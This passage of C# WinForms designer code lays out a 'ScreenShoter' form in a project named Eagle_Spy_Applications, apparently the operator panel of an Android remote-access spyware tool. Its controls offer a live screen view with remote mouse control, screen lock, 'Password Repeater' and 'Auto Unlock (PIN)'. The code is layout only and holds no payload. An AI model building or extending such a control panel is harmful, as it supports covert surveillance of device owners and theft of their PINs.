            this.SPanel1.Controls.Add(this.textsend);
            this.SPanel1.Controls.Add(this.pictureBox6);
            this.SPanel1.Controls.Add(this.DrakeUILabel1);
            this.SPanel1.Controls.Add(this.ClientPic);
            this.SPanel1.Controls.Add(this.Enterbutton);
            this.SPanel1.ForeColor = System.Drawing.Color.White;
            this.SPanel1.Location = new System.Drawing.Point(2, 0);
            this.SPanel1.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.SPanel1.Name = "SPanel1";
            this.SPanel1.Size = new System.Drawing.Size(527, 983);
            this.SPanel1.TabIndex = 3;
            // 
            // textsend
            // 
            this.textsend.BorderColor = System.Drawing.Color.Red;
            this.textsend.BorderRadius = 5;
            this.textsend.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.textsend.DefaultText = "";
            this.textsend.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.textsend.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.textsend.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textsend.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.textsend.FillColor = System.Drawing.Color.Black;
            this.textsend.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textsend.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.textsend.ForeColor = System.Drawing.Color.White;
            this.textsend.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
            this.textsend.Location = new System.Drawing.Point(16, 897);
            this.textsend.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.textsend.Name = "textsend";
            this.textsend.PasswordChar = '\0';
            this.textsend.PlaceholderText = "Enter text";
            this.textsend.SelectedText = "";
            this.textsend.Size = new System.Drawing.Size(399, 43);
            this.textsend.TabIndex = 98;
            // 
            // DrakeUILabel1
            // 
            this.DrakeUILabel1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUILabel1.Font = new System.Drawing.Font("Bahnschrift", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUILabel1.ForeColor = System.Drawing.Color.Red;
            this.DrakeUILabel1.Location = new System.Drawing.Point(34, 17);
            this.DrakeUILabel1.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.DrakeUILabel1.Name = "DrakeUILabel1";
            this.DrakeUILabel1.Size = new System.Drawing.Size(411, 39);
            this.DrakeUILabel1.TabIndex = 93;
            this.DrakeUILabel1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.DrakeUILabel1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.DrakeUILabel1_MouseDown);
            // 
            // panel12
            // 
            this.panel12.BackColor = System.Drawing.Color.Black;
            this.panel12.Location = new System.Drawing.Point(4, 12);
            this.panel12.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.panel12.Name = "panel12";
            this.panel12.Size = new System.Drawing.Size(440, 807);
            this.panel12.TabIndex = 2;
            // 
            // drakeUILabel4
            // 
            this.drakeUILabel4.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel4.ForeColor = System.Drawing.Color.Red;
            this.drakeUILabel4.Location = new System.Drawing.Point(265, 28);
            this.drakeUILabel4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel4.Name = "drakeUILabel4";
            this.drakeUILabel4.Size = new System.Drawing.Size(38, 31);
            this.drakeUILabel4.TabIndex = 104;
            this.drakeUILabel4.Text = "a6";
            this.drakeUILabel4.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUILabel5
            // 
            this.drakeUILabel5.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel5.ForeColor = System.Drawing.Color.Red;
            this.drakeUILabel5.Location = new System.Drawing.Point(44, 87);
            this.drakeUILabel5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel5.Name = "drakeUILabel5";
            this.drakeUILabel5.Size = new System.Drawing.Size(65, 39);
            this.drakeUILabel5.TabIndex = 104;
            this.drakeUILabel5.Text = "Stop";
            this.drakeUILabel5.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUILabel6
            // 
            this.drakeUILabel6.Font = new System.Drawing.Font("Bahnschrift", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUILabel6.ForeColor = System.Drawing.Color.Red;
            this.drakeUILabel6.Location = new System.Drawing.Point(43, 48);
            this.drakeUILabel6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.drakeUILabel6.Name = "drakeUILabel6";
            this.drakeUILabel6.Size = new System.Drawing.Size(66, 39);
            this.drakeUILabel6.TabIndex = 105;
            this.drakeUILabel6.Text = "Start";
            this.drakeUILabel6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUICheckBox1
            // 
            this.drakeUICheckBox1.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUICheckBox1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUICheckBox1.Enabled = false;
            this.drakeUICheckBox1.Font = new System.Drawing.Font("Calibri", 10F);
            this.drakeUICheckBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUICheckBox1.Location = new System.Drawing.Point(15, 302);
            this.drakeUICheckBox1.Margin = new System.Windows.Forms.Padding(4);
            this.drakeUICheckBox1.Name = "drakeUICheckBox1";
            this.drakeUICheckBox1.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.drakeUICheckBox1.Size = new System.Drawing.Size(36, 37);
            this.drakeUICheckBox1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUICheckBox1.StyleCustomMode = true;
            this.drakeUICheckBox1.TabIndex = 103;
            this.drakeUICheckBox1.TextAlign = System.Drawing.ContentAlignment.TopLeft;
            this.DrakeUIToolTip1.SetToolTip(this.drakeUICheckBox1, "Allow Screen Control While blocked");
            // 
            // drakeUIComboBox1
            // 
            this.drakeUIComboBox1.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.drakeUIComboBox1.FillColor = System.Drawing.Color.Black;
            this.drakeUIComboBox1.Font = new System.Drawing.Font("Calibri", 9F);
            this.drakeUIComboBox1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(177)))), ((int)(((byte)(225)))));
            this.drakeUIComboBox1.Location = new System.Drawing.Point(30, 426);
            this.drakeUIComboBox1.Margin = new System.Windows.Forms.Padding(6, 7, 6, 7);
            this.drakeUIComboBox1.MinimumSize = new System.Drawing.Size(94, 0);
            this.drakeUIComboBox1.Name = "drakeUIComboBox1";
            this.drakeUIComboBox1.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.drakeUIComboBox1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIComboBox1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.drakeUIComboBox1.Size = new System.Drawing.Size(94, 29);
            this.drakeUIComboBox1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIComboBox1.StyleCustomMode = true;
            this.drakeUIComboBox1.TabIndex = 103;
            this.drakeUIComboBox1.Text = "Slient";
            this.drakeUIComboBox1.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // pictureBox18
            // 
            this.pictureBox18.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox18.Image = global::Eagle_Spy_Applications.QQ20241001_174754;
            this.pictureBox18.Location = new System.Drawing.Point(77, 15);
            this.pictureBox18.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox18.Name = "pictureBox18";
            this.pictureBox18.Size = new System.Drawing.Size(53, 42);
            this.pictureBox18.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox18.TabIndex = 102;
            this.pictureBox18.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox18, "Screen Lock");
            // 
            // PictureBox14
            // 
            this.PictureBox14.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox14.Image = global::Eagle_Spy_Applications.TeenyiconsUnlockSolid;
            this.PictureBox14.Location = new System.Drawing.Point(326, 16);
            this.PictureBox14.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox14.Name = "PictureBox14";
            this.PictureBox14.Size = new System.Drawing.Size(36, 41);
            this.PictureBox14.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox14.TabIndex = 4;
            this.PictureBox14.TabStop = false;
            this.toolTip2.SetToolTip(this.PictureBox14, "Screen Lock");
            this.PictureBox14.Click += new System.EventHandler(this.PictureBox14_Click);
            // 
            // pictureBox8
            // 
            this.pictureBox8.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox8.Image = global::Eagle_Spy_Applications.VaadinPaperplane;
            this.pictureBox8.Location = new System.Drawing.Point(429, 894);
            this.pictureBox8.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox8.Name = "pictureBox8";
            this.pictureBox8.Size = new System.Drawing.Size(35, 29);
            this.pictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox8.TabIndex = 98;
            this.pictureBox8.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox8, "Screen Lock");
            // 
            // PictureBox10
            // 
            this.PictureBox10.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox10.Image = global::Eagle_Spy_Applications.IonLocked;
            this.PictureBox10.Location = new System.Drawing.Point(370, 15);
            this.PictureBox10.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox10.Name = "PictureBox10";
            this.PictureBox10.Size = new System.Drawing.Size(45, 44);
            this.PictureBox10.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox10.TabIndex = 0;
            this.PictureBox10.TabStop = false;
            this.toolTip2.SetToolTip(this.PictureBox10, "Screen Reader");
            this.PictureBox10.Click += new System.EventHandler(this.PictureBox10_Click);
            // 
            // pictureBox5
            // 
            this.pictureBox5.BackColor = System.Drawing.Color.Black;
            this.pictureBox5.Location = new System.Drawing.Point(4, 3);
            this.pictureBox5.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox5.Name = "pictureBox5";
            this.pictureBox5.Size = new System.Drawing.Size(440, 807);
            this.pictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox5.TabIndex = 1;
            this.pictureBox5.TabStop = false;
            this.pictureBox5.Tag = "Tag";
            // 
            // Livepicbox
            // 
            this.Livepicbox.BackColor = System.Drawing.Color.Black;
            this.Livepicbox.Enabled = false;
            this.Livepicbox.Location = new System.Drawing.Point(11, 59);
            this.Livepicbox.Margin = new System.Windows.Forms.Padding(4);
            this.Livepicbox.Name = "Livepicbox";
            this.Livepicbox.Size = new System.Drawing.Size(441, 834);
            this.Livepicbox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.Livepicbox.TabIndex = 1;
            this.Livepicbox.TabStop = false;
            this.Livepicbox.MouseDown += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseDown);
            this.Livepicbox.MouseMove += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseMove);
            this.Livepicbox.MouseUp += new System.Windows.Forms.MouseEventHandler(this.PictureBox1_MouseUp);
            // 
            // pictureBox6
            // 
            this.pictureBox6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox6.Image = global::Eagle_Spy_Applications.Panel6_BackgroundImage;
            this.pictureBox6.Location = new System.Drawing.Point(-1, 4);
            this.pictureBox6.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox6.Name = "pictureBox6";
            this.pictureBox6.Size = new System.Drawing.Size(465, 957);
            this.pictureBox6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox6.TabIndex = 104;
            this.pictureBox6.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox6, "Screen View");
            // 
            // ClientPic
            // 
            this.ClientPic.Location = new System.Drawing.Point(958, 10);
            this.ClientPic.Margin = new System.Windows.Forms.Padding(4);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(123, 46);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.ClientPic.TabIndex = 78;
            this.ClientPic.TabStop = false;
            // 
            // Enterbutton
            // 
            this.Enterbutton.AutoRoundedCorners = true;
            this.Enterbutton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Enterbutton.BorderRadius = 13;
            this.Enterbutton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Enterbutton.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Enterbutton.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Enterbutton.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Enterbutton.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Enterbutton.FillColor = System.Drawing.Color.Transparent;
            this.Enterbutton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Enterbutton.ForeColor = System.Drawing.Color.White;
            this.Enterbutton.HoverState.BorderColor = System.Drawing.Color.Aqua;
            this.Enterbutton.Image = global::Eagle_Spy_Applications.icons8_send_30;
            this.Enterbutton.Location = new System.Drawing.Point(396, 901);
            this.Enterbutton.Margin = new System.Windows.Forms.Padding(4);
            this.Enterbutton.Name = "Enterbutton";
            this.Enterbutton.Size = new System.Drawing.Size(30, 28);
            this.Enterbutton.TabIndex = 89;
            this.Enterbutton.Click += new System.EventHandler(this.Enterbutton_Click);
            // 
            // pictureBox13
            // 
            this.pictureBox13.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox13.Image = global::Eagle_Spy_Applications.MaterialSymbolsCircle;
            this.pictureBox13.Location = new System.Drawing.Point(54, 836);
            this.pictureBox13.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox13.Name = "pictureBox13";
            this.pictureBox13.Size = new System.Drawing.Size(37, 33);
            this.pictureBox13.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox13.TabIndex = 100;
            this.pictureBox13.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox13, "Screen Lock");
            // 
            // pictureBox17
            // 
            this.pictureBox17.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox17.Image = global::Eagle_Spy_Applications.QQ20241001_173026;
            this.pictureBox17.Location = new System.Drawing.Point(58, 679);
            this.pictureBox17.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox17.Name = "pictureBox17";
            this.pictureBox17.Size = new System.Drawing.Size(31, 45);
            this.pictureBox17.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox17.TabIndex = 101;
            this.pictureBox17.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox17, "Screen Lock");
            // 
            // pictureBox12
            // 
            this.pictureBox12.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox12.Image = global::Eagle_Spy_Applications.LetsIconsReturn;
            this.pictureBox12.Location = new System.Drawing.Point(54, 884);
            this.pictureBox12.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox12.Name = "pictureBox12";
            this.pictureBox12.Size = new System.Drawing.Size(38, 39);
            this.pictureBox12.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox12.TabIndex = 99;
            this.pictureBox12.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox12, "Screen Lock");
            // 
            // pictureBox16
            // 
            this.pictureBox16.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox16.Image = global::Eagle_Spy_Applications.photo_2023_11_21_13_40_14;
            this.pictureBox16.Location = new System.Drawing.Point(54, 739);
            this.pictureBox16.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox16.Name = "pictureBox16";
            this.pictureBox16.Size = new System.Drawing.Size(38, 39);
            this.pictureBox16.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox16.TabIndex = 101;
            this.pictureBox16.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox16, "Screen Lock");
            // 
            // PictureBox9
            // 
            this.PictureBox9.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox9.Image = global::Eagle_Spy_Applications.MaterialSymbolsMinimizeRounded;
            this.PictureBox9.Location = new System.Drawing.Point(58, -30);
            this.PictureBox9.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox9.Name = "PictureBox9";
            this.PictureBox9.Size = new System.Drawing.Size(51, 65);
            this.PictureBox9.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox9.TabIndex = 96;
            this.PictureBox9.TabStop = false;
            this.PictureBox9.Click += new System.EventHandler(this.PictureBox9_Click);
            // 
            // Guna2Button5
            // 
            this.Guna2Button5.AutoRoundedCorners = true;
            this.Guna2Button5.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Guna2Button5.BorderRadius = 14;
            this.Guna2Button5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button5.FillColor = System.Drawing.Color.Transparent;
            this.Guna2Button5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button5.ForeColor = System.Drawing.Color.White;
            this.Guna2Button5.Image = global::Eagle_Spy_Applications.MaterialSymbolsCloseRounded;
            this.Guna2Button5.ImageSize = new System.Drawing.Size(25, 25);
            this.Guna2Button5.Location = new System.Drawing.Point(107, 4);
            this.Guna2Button5.Margin = new System.Windows.Forms.Padding(4);
            this.Guna2Button5.Name = "Guna2Button5";
            this.Guna2Button5.Size = new System.Drawing.Size(38, 31);
            this.Guna2Button5.TabIndex = 88;
            this.Guna2Button5.Click += new System.EventHandler(this.Guna2Button5_Click);
            // 
            // PictureBox11
            // 
            this.PictureBox11.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox11.Image = global::Eagle_Spy_Applications.QQ20241001_173033;
            this.PictureBox11.Location = new System.Drawing.Point(34, 357);
            this.PictureBox11.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox11.Name = "PictureBox11";
            this.PictureBox11.Size = new System.Drawing.Size(75, 58);
            this.PictureBox11.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox11.TabIndex = 1;
            this.PictureBox11.TabStop = false;
            this.toolTip2.SetToolTip(this.PictureBox11, "Screen View");
            this.PictureBox11.Click += new System.EventHandler(this.PictureBox11_Click);
            // 
            // pictureBox7
            // 
            this.pictureBox7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox7.Image = global::Eagle_Spy_Applications.icons8_browser_64;
            this.pictureBox7.Location = new System.Drawing.Point(854, 1020);
            this.pictureBox7.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox7.Name = "pictureBox7";
            this.pictureBox7.Size = new System.Drawing.Size(34, 28);
            this.pictureBox7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox7.TabIndex = 97;
            this.pictureBox7.TabStop = false;
            this.pictureBox7.Click += new System.EventHandler(this.pictureBox7_Click);
            // 
            // PictureBox3
            // 
            this.PictureBox3.Location = new System.Drawing.Point(93, 26);
            this.PictureBox3.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox3.Name = "PictureBox3";
            this.PictureBox3.Size = new System.Drawing.Size(40, 32);
            this.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox3.TabIndex = 1;
            this.PictureBox3.TabStop = false;
            // 
            // PictureBox2
            // 
            this.PictureBox2.Location = new System.Drawing.Point(39, 15);
            this.PictureBox2.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox2.Name = "PictureBox2";
            this.PictureBox2.Size = new System.Drawing.Size(45, 44);
            this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox2.TabIndex = 0;
            this.PictureBox2.TabStop = false;
            // 
            // PictureBox1
            // 
            this.PictureBox1.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.PictureBox1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox1.Location = new System.Drawing.Point(-32, 258);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(112, 47);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox1.TabIndex = 38;
            this.PictureBox1.TabStop = false;
            this.PictureBox1.Click += new System.EventHandler(this.PictureBox1_Click);
            // 
            // Button5
            // 
            this.Button5.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button5.Image = global::Eagle_Spy_Applications.icons8_back_64;
            this.Button5.Location = new System.Drawing.Point(840, 1014);
            this.Button5.Margin = new System.Windows.Forms.Padding(4);
            this.Button5.Name = "Button5";
            this.Button5.Size = new System.Drawing.Size(48, 39);
            this.Button5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button5.TabIndex = 92;
            this.Button5.TabStop = false;
            this.Button5.Click += new System.EventHandler(this.Button5_Click);
            // 
            // Button7
            // 
            this.Button7.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button7.Image = global::Eagle_Spy_Applications.icons8_xbox_menu_30;
            this.Button7.Location = new System.Drawing.Point(841, 1012);
            this.Button7.Margin = new System.Windows.Forms.Padding(4);
            this.Button7.Name = "Button7";
            this.Button7.Size = new System.Drawing.Size(48, 39);
            this.Button7.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button7.TabIndex = 91;
            this.Button7.TabStop = false;
            this.Button7.Click += new System.EventHandler(this.Button7_Click);
            // 
            // StartButton
            // 
            this.StartButton.AutoRoundedCorners = true;
            this.StartButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.StartButton.BorderRadius = 17;
            this.StartButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.StartButton.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.StartButton.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.StartButton.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.StartButton.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.StartButton.FillColor = System.Drawing.Color.Transparent;
            this.StartButton.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.StartButton.ForeColor = System.Drawing.Color.White;
            this.StartButton.Image = global::Eagle_Spy_Applications.icons8_power_off_button_641;
            this.StartButton.ImageSize = new System.Drawing.Size(28, 28);
            this.StartButton.Location = new System.Drawing.Point(848, 1009);
            this.StartButton.Margin = new System.Windows.Forms.Padding(4);
            this.StartButton.Name = "StartButton";
            this.StartButton.Size = new System.Drawing.Size(40, 37);
            this.StartButton.TabIndex = 87;
            this.StartButton.Click += new System.EventHandler(this.StartButton_Click);
            // 
            // Guna2Button2
            // 
            this.Guna2Button2.AutoRoundedCorners = true;
            this.Guna2Button2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.Guna2Button2.BorderRadius = 16;
            this.Guna2Button2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.Guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.Guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.Guna2Button2.FillColor = System.Drawing.Color.Transparent;
            this.Guna2Button2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.Guna2Button2.ForeColor = System.Drawing.Color.White;
            this.Guna2Button2.HoverState.BorderColor = System.Drawing.Color.Aqua;
            this.Guna2Button2.Image = global::Eagle_Spy_Applications.icons8_stop_503;
            this.Guna2Button2.ImageSize = new System.Drawing.Size(25, 25);
            this.Guna2Button2.Location = new System.Drawing.Point(855, 1011);
            this.Guna2Button2.Margin = new System.Windows.Forms.Padding(4);
            this.Guna2Button2.Name = "Guna2Button2";
            this.Guna2Button2.Size = new System.Drawing.Size(36, 35);
            this.Guna2Button2.TabIndex = 86;
            this.Guna2Button2.Click += new System.EventHandler(this.Guna2Button2_Click);
            // 
            // Button6
            // 
            this.Button6.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button6.Image = global::Eagle_Spy_Applications.icons8_stop_100;
            this.Button6.Location = new System.Drawing.Point(843, 1009);
            this.Button6.Margin = new System.Windows.Forms.Padding(4);
            this.Button6.Name = "Button6";
            this.Button6.Size = new System.Drawing.Size(48, 39);
            this.Button6.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.Button6.TabIndex = 90;
            this.Button6.TabStop = false;
            this.Button6.Click += new System.EventHandler(this.Button6_Click);
            // 
            // pictureBox4
            // 
            this.pictureBox4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pictureBox4.Image = global::Eagle_Spy_Applications.icons8_speaker_64;
            this.pictureBox4.Location = new System.Drawing.Point(835, 997);
            this.pictureBox4.Margin = new System.Windows.Forms.Padding(4);
            this.pictureBox4.Name = "pictureBox4";
            this.pictureBox4.Size = new System.Drawing.Size(60, 58);
            this.pictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox4.TabIndex = 6;
            this.pictureBox4.TabStop = false;
            this.toolTip2.SetToolTip(this.pictureBox4, "Password Repeater");
            // 
            // PictureBox15
            // 
            this.PictureBox15.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PictureBox15.Image = global::Eagle_Spy_Applications.icons8_no_audio_64;
            this.PictureBox15.Location = new System.Drawing.Point(837, 999);
            this.PictureBox15.Margin = new System.Windows.Forms.Padding(4);
            this.PictureBox15.Name = "PictureBox15";
            this.PictureBox15.Size = new System.Drawing.Size(60, 58);
            this.PictureBox15.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.PictureBox15.TabIndex = 5;
            this.PictureBox15.TabStop = false;
            this.toolTip2.SetToolTip(this.PictureBox15, "Auto Unlock (PIN)");
            // 
            // ScreenShoter
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(9F, 18F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.ClientSize = new System.Drawing.Size(708, 984);
            this.Controls.Add(this.SPanel1);
            this.Controls.Add(this.SPanel3);
            this.Controls.Add(this.pictureBox7);
            this.Controls.Add(this.Panel6);
            this.Controls.Add(this.Panel7);
            this.Controls.Add(this.Button5);
            this.Controls.Add(this.Button7);
            this.Controls.Add(this.StartButton);
            this.Controls.Add(this.Guna2Button2);
            this.Controls.Add(this.Button6);
            this.Controls.Add(this.pictureBox4);
            this.Controls.Add(this.PictureBox15);
            this.Controls.Add(this.checkblock);
            this.DoubleBuffered = true;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4, 4, 4, 4);
            this.MaximumSize = new System.Drawing.Size(1000, 984);
            this.MinimumSize = new System.Drawing.Size(700, 984);
            this.Name = "ScreenShoter";
            this.ShowIcon = false;
            this.Text = "ScreenShoter";
            this.vewpnl.ResumeLayout(false);
            this.Panel8.ResumeLayout(false);
            this.Panel1.ResumeLayout(false);
            this.Panel2.ResumeLayout(false);
            this.Panel5.ResumeLayout(false);
            this.Panel6.ResumeLayout(false);
            this.Panel7.ResumeLayout(false);
            this.Panel9.ResumeLayout(false);
            this.SPanel3.ResumeLayout(false);
            this.SPanel3.PerformLayout();
